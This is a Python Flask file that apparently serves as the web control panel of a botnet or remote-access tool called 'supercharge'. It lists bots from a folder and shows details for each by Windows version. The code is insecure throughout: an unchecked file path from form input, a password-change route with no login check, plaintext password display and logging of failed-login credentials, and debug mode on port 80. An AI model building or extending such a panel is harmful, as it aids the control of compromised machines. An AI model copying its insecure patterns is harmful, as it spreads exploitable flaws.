from flask import Flask, render_template
from flask import request, session
import configparser, time, os
from .infodb import webbotinfo, ReadInformation, WBOTNAMEONLY, BOTOSONLY
import random

config = configparser.ConfigParser()
try:
    config.read("supercharge.ini")
except Exception as e:
    print(str(e))
    
maincfg = config['server']
user = config['user']

botlist = []
botfolder = "bots/"


def load_list():
    del botlist[:]
    files = os.listdir(botfolder)
    for f in files:
        noext = os.path.splitext(f)[0]
        if("readme" not in noext):
            botlist.append(noext)

def return_status():
    str1 = "All things functional.."
    str2 = "First change your world then change other worlds. - Quantumkernel"
    str3 = "The quick brown fox jumps over the lazy dog"
    str4 = "This is not AI this is just Random selection of strings displayed to you :v"
    str5 = "Life's not fair. Get used to it. - Bill Gates."
    str6 = "Hello, World!"
    str7 = "You either die a hero, Or live long enough to see yourself become the Villian. - Harvey Dent."
    str8 = "Be Phenomenal. - Quantumkernel."
    str9 = "Intelligence is the ability to avoid doing work, yet getting the work done. - Linus Torvalds."
    str10 = "Always do your best. What you plant now, you will harvest later. - OG Mandino."
    return random.choice([str1, str2, str3, str4, str5, str6, str7, str8, str9, str10])
        
def WebApp():
    app = Flask("supercharge Offline", template_folder="templates")
    app.static_folder = "static"

    def saveLog(data, moredata, ip):
        timenow = time.strftime("%Y%m%d-%H%M%S")
        with open("suspicious-logins/" + timenow + ".txt", "w+") as file:
            file.write("Suspicious Login From " + ip)
            file.write("\n\nData :" + "\nUSERNAME : " + data + "\nPASSWORD : " + moredata + "\n")

    @app.route("/")
    def webui():
        return render_template("index.html")

    @app.route("/index.html")
    def back():
        return render_template("index.html")

    @app.route("/login", methods=['POST'])
    def loginUser():
        if(request.form['password'] == user['password'] and request.form["username"] == user['username']):
            session['logged_in'] = True
            return render_template("main.html", host="Welcome, " + user['username'] + "!", msg=return_status())
        else:
            print("Suspicious login from " + request.remote_addr)
            saveLog(request.form['username'], request.form['password'], request.remote_addr)
            return render_template("failure.html")


    @app.route("/settings")
    def settings():
        if(session.get('logged_in')):
            return render_template("settings.html", usern=user['username'], passw=user['password'], ip=maincfg['host'], port=maincfg['port'])
        else:
            return render_template("index.html")

    @app.route("/showbotinfo", methods=['POST'])
    def showbotinfo():
        if(session.get('logged_in')):
            forbot = request.form['forbot']
            print(forbot)
            ReadInformation("bots/"+forbot)
            if(BOTOSONLY(forbot) == "Windows 8" or BOTOSONLY(forbot) == "Windows 10"):
                return render_template("botinfo_winten.html", info=webbotinfo, botname=WBOTNAMEONLY(forbot))
            elif(BOTOSONLY(forbot) == "Windows 7"):
                return render_template("botinfo_winseven.html", info=webbotinfo, botname=WBOTNAMEONLY(forbot))
            else:
                return render_template("botinfo_winxp.html", info=webbotinfo, botname=WBOTNAMEONLY(forbot))
        else:
            return render_template("index.html")


    @app.route("/cp")
    def cp():
        if(session.get('logged_in')):
            return render_template("main.html", host=user['username'], msg=return_status())
        else:
            return render_template("index.html")
        
    @app.route("/bots")
    def view_bots():
        if(session.get('logged_in')):
            load_list()
            return render_template("bots.html", botlist=botlist)
        else:
            return render_template("index.html")

    @app.route("/about")
    def about():
        if(session.get('logged_in')):
            return render_template("about.html")
        else:
            return render_template("index.html")
            
    @app.route("/passchange")
    def passchange():
        if(session.get('logged_in')):
            return render_template("passchange.html")
        else:
            return render_template("index.html")

    @app.route("/passchange_success", methods=['POST'])
    def changePassword():
        newusername = request.form['newusername']
        newpass = request.form['newpassword']
        repass = request.form['repass']
        currentpass = request.form['currentpass']

        if(currentpass == user['password']):
            if(newpass == repass):
                config.set("user", "username", newusername)
                config.set("user", "password", newpass)
                with open("supercharge.ini", "w") as cfg:
                    config.write(cfg)

                session['logged_in'] = False
                return render_template("index.html")
            else:
                return render_template("main.html", msg="Your last password change attempt resulted in a failure because of wrong passwords.")
        else:
            return render_template("main.html", msg="Your last password change attempt resulted in a failure because of Wrong Password.")


    @app.route("/server_settings")
    def server_settings():
        if(session.get('logged_in')):
            return render_template("server_settings.html")
        else:
            return render_template("login.html")

    @app.route("/changesuccess", methods=['POST'])
    def newHostnPort():
        if(session.get('logged_in')):
            newhost = request.form['newhost']
            newport = request.form['newport']
            config.set("server", "host", newhost)
            config.set("server", "port", newport)
            with open("supercharge.ini", "w") as cfg:
                config.write(cfg)
            return render_template("main.html", msg="Host and Port changed.")
        else:
            return render_template("login.html")

    @app.route("/logout")
    def logout():
        session['logged_in'] = False
        return render_template("index.html")

    app.secret_key = os.urandom(12)
    app.run(port=80, debug=True, use_reloader=True)
    
